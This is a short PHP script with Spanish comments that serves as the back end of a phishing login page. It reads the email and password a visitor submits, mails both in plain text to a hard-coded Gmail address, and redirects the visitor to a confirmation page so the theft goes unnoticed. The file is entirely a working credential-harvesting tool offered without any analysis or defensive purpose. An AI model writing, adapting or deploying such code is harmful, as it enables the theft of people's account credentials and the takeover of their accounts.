<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Enviar los datos a la dirección de correo electrónico especificada
    $to = "yoyoydomi123@gmail.com";
    $subject = "Inicio de sesión - Información";
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;
    
    // Utiliza la función mail() para enviar el correo electrónico
    mail($to, $subject, $message);

    // Redirige al usuario a una página de confirmación o a donde desees
    header("Location: confirmation.html");
    exit();
}
?>